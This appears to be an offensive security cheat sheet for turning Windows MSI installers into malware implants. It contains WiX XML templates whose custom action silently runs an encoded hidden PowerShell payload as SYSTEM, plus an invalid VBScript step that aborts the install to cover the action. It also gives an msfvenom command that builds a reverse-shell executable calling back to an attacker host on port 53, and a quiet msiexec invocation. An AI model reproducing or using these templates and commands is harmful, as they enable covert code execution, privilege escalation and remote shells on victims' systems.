# MSI

## 01 - Setup

### 1.1 - `msitools`

Install the packages.

```
$ sudo apt install -y msitools wixl
```

### 1.2 - DotNET

```
$ dotnet tool install --global wix
```

## 02 - Compile Implant

### 2.1 - Fileless implant

TODO: Figure out how to compile it in `dotnet` to resolve the issue.

At minimum, the `Property` line needs to be changed to the command you want to execute. Also needs to be changed in order to build the MSI installer.

```xml
<File Id="ApplicationFile1" Source="Updater.exe"/>
```

The important parts to note of the `CustomAction` tag.

```xml
<Property Id="cmdline">powershell.exe -nop -w hidden -e <base64_payload></Property>
<CustomAction Id="SystemShell" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/>
</CustomAction>
```

Finally, we have our `InstallExecuteSequence` tag, which is responsible for executing our custom actions in order. So, when executed our first custom action will be launched, forcing our payload to run as the SYSTEM account. Our second custom action will be launched, causing some invalid VBScript to be executed and stop the install process with an error.

```xml
<InstallExecuteSequence>
 <Custom Action="SystemShell" After="InstallInitialize"></Custom>
 <Custom Action="FailInstall" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
```

Name this file `msigen.wix`.

```xml
<?xml version="1.0"?>
<Wix xmlns="http://wixtoolset.org/schemas/v4/wxs">
 <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
  <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
  <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>

  <Directory Id="TARGETDIR" Name="SourceDir">
   <Directory Id="ProgramFilesFolder">
    <Directory Id="INSTALLLOCATION" Name="Example">
     <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
      <File Id="ApplicationFile1" Source="Updater.exe"/>
     </Component>
    </Directory>
   </Directory>
  </Directory>

  <Feature Id="DefaultFeature" Level="1">
   <ComponentRef Id="ApplicationFiles"/>
  </Feature>

  <Property Id="cmdline">powershell.exe -nop -w hidden -e <base64_payload>
  </Property>

  <CustomAction Id="SystemShell" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/>
  </CustomAction>

  <InstallExecuteSequence>
   <Custom Action="SystemShell" After="InstallInitialize"></Custom>
  </InstallExecuteSequence>

 </Product>
</Wix>
```

We have received an error.

```
$ touch Updater.exe

$ wixl -v msigen.wix -o implant.msi
```

Let's convert it and build an MSI installer.

```
$ wix convert msigen.wix

$ wix build msigen.wix -o implant.msi
```

### 2.1 - Dropper implant

```xml
<?xml version='1.0' encoding='windows-1252'?>
<Wix xmlns='http://wixtoolset.org/schemas/v4/wxs'>
  <Product Name='Foobar 1.0' Id='ABCDDCBA-86C7-4D14-AEC0-86416A69ABDE' UpgradeCode='ABCDDCBA-7349-453F-94F6-BCB5110BA4FD'
    Language='1033' Codepage='1252' Version='1.0.0' Manufacturer='Acme Ltd.'>

    <Package Id='*' Keywords='Installer' Description="Acme's Foobar 1.0 Installer"
      Comments='Foobar is a registered trademark of Acme Ltd.' Manufacturer='Acme Ltd.'
      InstallerVersion='100' Languages='1033' Compressed='yes' SummaryCodepage='1252' />

    <Media Id='1' Cabinet='Sample.cab' EmbedCab='yes' DiskPrompt="CD-ROM #1" />
    <Property Id='DiskPrompt' Value="Acme's Foobar 1.0 Installation [1]" />

    <Directory Id='TARGETDIR' Name='SourceDir'>
      <Directory Id='ProgramFilesFolder' Name='PFiles'>
        <Directory Id='Acme' Name='Acme'>
          <Directory Id='INSTALLDIR' Name='Foobar 1.0'>

            <Component Id='MainExecutable' Guid='ABCDDCBA-83F1-4F22-985B-FDB3C8ABD471'>
              <File Id='FoobarEXE' Name='FoobarAppl10.exe' DiskId='1' Source='Updater.exe' KeyPath='yes'/>
            </Component>

          </Directory>
        </Directory>
      </Directory>
    </Directory>

    <Feature Id='Complete' Level='1'>
      <ComponentRef Id='MainExecutable' />
    </Feature>

  </Product>
</Wix>
```

For fileless malware just make an empty file `touch Updater.exe` unless if it's a dropper then generate with `msfvenom` implant. Then build a MSI installer.

```
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=53 -f exe -o Updater.exe

$ wixl -v msigen.wix -o implant.msi
Loading msigen.wix...
Building implant.msi...
Writing implant.msi...
```

---
## Draft


```xml
<?xml version="1.0"?>
<Wix xmlns="http://wixtoolset.org/schemas/v4/wxs">
 <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
  <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
  <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>

  <Directory Id="TARGETDIR" Name="SourceDir">
   <Directory Id="ProgramFilesFolder">
    <Directory Id="INSTALLLOCATION" Name="Example">
     <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
      <File Id="ApplicationFile1" Source="Updater.exe"/>
     </Component>
    </Directory>
   </Directory>
  </Directory>

  <Feature Id="DefaultFeature" Level="1">
   <ComponentRef Id="ApplicationFiles"/>
  </Feature>

  <Property Id="cmdline">powershell.exe -nop -w hidden -e <base64_payload>
  </Property>

  <CustomAction Id="SystemShell" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/>
  <CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check">
   invalid vbs to fail install
  </CustomAction>

  <InstallExecuteSequence>
   <Custom Action="SystemShell" After="InstallInitialize"></Custom>
   <Custom Action="FailInstall" Before="InstallFiles"></Custom>
  </InstallExecuteSequence>

 </Product>
</Wix>
```

## Command Execution

| Flag     | Description                                            |
| -------- | ------------------------------------------------------ |
| `/quiet` | Suppress any messages to the user during installation. |
| `/qn`    | No GUI                                                 |
| `/i`     | Regular (vs. administrative) installation              |

```
C:\> msiexec /quiet /qn /i implant.msi "C:\path\to\implant.msi"
```

---
## References

### LOLBAS

- [LOLBAS: Msiexec](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)

### mgeeky

- [mgeeky: MSI Shenanigans. Part 1 - Offensive Capabilities Overview](https://mgeeky.tech/msi-shenanigans-part-1/)